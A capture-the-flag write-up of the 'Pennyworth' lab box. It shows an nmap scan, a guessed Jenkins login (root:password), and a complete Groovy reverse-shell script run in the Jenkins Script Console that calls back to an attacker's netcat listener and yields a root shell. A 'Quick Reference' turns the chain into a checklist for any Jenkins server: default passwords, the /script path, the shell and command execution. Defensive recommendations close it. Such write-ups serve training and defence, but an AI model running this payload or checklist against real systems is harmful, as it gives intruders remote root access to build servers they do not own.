# PENNYWORTH - Very Easy

**Date Started:** February 3, 2026  
**Difficulty:** Very Easy  
**Status:** ✅ COMPLETE

---

## Phase 1: Initial Reconnaissance

### Step 1: Initial Service Enumeration Scan

**Command:**
```bash
nmap -sC -sV TARGET_IP
```

**Explanation:**
- `-sV`: Service version enumeration
- `-sC`: Run default NSE scripts for vulnerability detection

**Scan Results:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 8080 | HTTP | Jetty 9.4.39.v20210325 | Open |

**Key Findings:**
- Jetty web server running on port 8080 (non-standard HTTP port)
- Jetty version 9.4.39 - commonly used to host Jenkins
- **Service Identified:** Jenkins CI/CD Server

---

## Phase 2: Web Enumeration & Jenkins Discovery

### Step 1: Access Jenkins Web Interface

**Action:** Navigate to `http://TARGET_IP:8080` in browser

**Response:** Jenkins login prompt

**Technology Confirmed:** Jenkins Continuous Integration/Continuous Deployment (CI/CD) server

### Step 2: Enumerate Jenkins Credentials

**Strategy:** Test common default Jenkins credentials and weak passwords

**Credentials Tested:**
- admin / admin
- admin / password
- root / root
- root / password ✅ **SUCCESS**

**Valid Credentials Found:**
- **Username:** `root`
- **Password:** `password`

### Step 3: Authenticate to Jenkins

**Action:** Login with credentials `root:password`

**Result:** ✅ Successfully authenticated to Jenkins dashboard

**Access Level:** Full Jenkins access (as admin user)

---

## Phase 3: Jenkins Script Console & RCE

### Step 1: Locate Script Console

**Finding:** Jenkins dashboard shows a Groovy script, but clicking on it provides no useful information

**Discovery:** Jenkins provides a `/script` endpoint that grants access to the **Script Console**

**Action:** Navigate to `http://TARGET_IP:8080/script`

**Result:** Jenkins Script Console loads - allows execution of arbitrary Groovy code on the server

### Step 2: Understanding Jenkins Script Console

**What is it:** Jenkins Script Console allows execution of Groovy scripts with full access to Jenkins' Java runtime and the underlying operating system.

**Security Risk:** Accessible to authenticated users → can execute system commands → RCE vulnerability

**Key Point:** This is a **known feature** of Jenkins used for administrative tasks, but becomes a **vulnerability** when accessible to unauthorized users or with weak credentials.

---

## Phase 4: Reverse Shell Exploitation

### Step 1: Prepare Attack Infrastructure

**Attacker Machine - Start Netcat Listener:**
```bash
nc -lvnp 8000
```

**Explanation:**
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: Numeric IP only (no DNS)
- `-p 8000`: Listen on port 8000

**Result:** Netcat waits for incoming connection on port 8000

### Step 2: Groovy Reverse Shell Script Analysis

**Script Breakdown:**

```groovy
String host="{your_IP}";              // Attacker IP address
int port=8000;                         // Attacker listening port
String cmd="/bin/bash";                // Shell to execute (bash)

// Create the bash process
Process p=new ProcessBuilder(cmd)
    .redirectErrorStream(true)         // Combine stderr with stdout
    .start();

// Create socket connection to attacker machine
Socket s=new Socket(host,port);

// Set up input/output streams
InputStream pi=p.getInputStream(),     // Process input (bash output)
InputStream pe=p.getErrorStream(),     // Process error stream
InputStream si=s.getInputStream();     // Socket input (from attacker)

OutputStream po=p.getOutputStream(),   // Process output (bash input)
OutputStream so=s.getOutputStream();   // Socket output (to attacker)

// Main loop - redirect data between bash and socket
while(!s.isClosed()) {
    // Send bash output to attacker
    while(pi.available()>0)
        so.write(pi.read());
    
    // Send bash errors to attacker
    while(pe.available()>0)
        so.write(pe.read());
    
    // Send attacker commands to bash
    while(si.available()>0)
        po.write(si.read());
    
    so.flush();                        // Flush output to attacker
    po.flush();                        // Flush output to bash
    Thread.sleep(50);                  // Prevent CPU spin
    
    try {
        p.exitValue();                 // Check if process exited
        break;                         // Exit loop if bash terminates
    } catch (Exception e) {}           // Continue if bash still running
}

p.destroy();                           // Kill bash process
s.close();                             // Close socket connection
```

**What This Script Does:**

1. **Creates a bash process** on the target machine
2. **Opens a network socket** connection back to attacker IP:port
3. **Redirects bash I/O** through the socket:
   - Bash output → sent to attacker
   - Attacker commands → sent to bash
4. **Maintains connection** in a loop until process exits
5. **Provides interactive shell** to attacker

**Result:** Reverse shell - attacker gets interactive bash access as the Jenkins process user (root)

### Step 3: Execute Reverse Shell Payload

**Action:** Copy the Groovy script into Jenkins Script Console

**Modification:** Replace `{your_IP}` with attacker machine IP

**Example:**
```groovy
String host="192.168.1.100";  // Your attacker IP
int port=8000;
String cmd="/bin/bash";
// ... rest of script
```

**Action:** Click "Run" in Script Console

**Result:** Script executes on target server, initiates reverse connection

### Step 4: Receive Reverse Shell Connection

**Netcat Output (on attacker machine):**
```
listening on [any] 8000 ...
connect to [attacker_ip] from [target_ip] [random_port]
```

**Interactive Shell Received:** Attacker now has bash prompt on target system

---

## Phase 5: Flag Capture

### Step 1: Verify Privilege Level

**Command:**
```bash
whoami
```

**Response:**
```
root
```

**Finding:** Reverse shell is running as root (Jenkins running as root)

### Step 2: Navigate to Root Directory

**Command:**
```bash
cd /root
```

### Step 3: List Root Directory Contents

**Command:**
```bash
ls
```

**Response:**
```
flag.txt
```

**Finding:** Flag file located in root home directory

### Step 4: Read Flag

**Command:**
```bash
cat flag.txt
```

**Response:** Flag captured successfully!

---

## Key Findings

| Item | Details |
|------|---------|
| **Vulnerability Type** | Weak Credentials + Script Console RCE |
| **Primary Attack Vector** | Jenkins default/weak admin credentials |
| **Secondary Attack Vector** | Jenkins Script Console (Groovy code execution) |
| **Privilege Escalation** | Not needed - Jenkins running as root |
| **Root Cause** | Weak password + dangerous feature enabled |
| **Reverse Shell Type** | Interactive bash via socket redirection |
| **Network Protocol** | TCP socket on port 8000 |

### Exploitation Chain Summary

1. **Reconnaissance** → Identify Jenkins on port 8080
2. **Credential Testing** → Find weak credentials (root:password)
3. **Authentication** → Gain admin access
4. **Script Console Access** → Discover /script endpoint
5. **RCE Payload Development** → Create reverse shell Groovy script
6. **Reverse Connection** → Receive interactive shell on attacker machine
7. **Post-Exploitation** → Verify root privileges and capture flag

### Security Issues Identified

- **Weak Credentials:** Default/weak passwords used (root:password)
- **Dangerous Feature:** Script Console allows arbitrary code execution
- **Running as Root:** Jenkins process running with root privileges
- **No Access Controls:** Script Console accessible to any authenticated user
- **No Audit Logging:** No detection of Script Console abuse

---

## Quick Reference: Jenkins RCE

### When You Find Jenkins:

1. **Test Default Credentials:**
   - admin / admin
   - admin / password
   - root / root
   - root / password

2. **Navigate to Script Console:**
   - Path: `/script` (e.g., `http://target:8080/script`)

3. **Execute Reverse Shell:**
   - Use Groovy script above
   - Replace IP and port with your values
   - Start netcat listener first

4. **Alternative: Direct Command Execution**
   ```groovy
   // If you just want command output (not interactive shell):
   def proc = "whoami".execute()
   println proc.text
   ```

5. **Jenkins Scripting References:**
   - Groovy documentation: Official Java/Groovy syntax
   - Jenkins Groovy Security: [Jenkins Security Advisory](https://www.jenkins.io/security/advisory/)
   - ProcessBuilder: Java process creation

### Defensive Recommendations

- **Change Default Credentials:** Use strong, unique passwords
- **Disable Script Console:** Remove admin access to /script endpoint
- **Run with Least Privilege:** Jenkins should NOT run as root
- **Network Segmentation:** Restrict Jenkins access to internal networks only
- **Authentication:** Implement multi-factor authentication for Jenkins
- **Update Regularly:** Keep Jenkins and plugins updated
- **Audit Logging:** Enable and monitor Script Console usage
- **Access Control:** Restrict who can access Jenkins admin features
- **Sandboxing:** Use Jenkins in containerized/sandboxed environments

---

**Status:** ✅ FLAG CAPTURED - ROOT ACCESS ACHIEVED

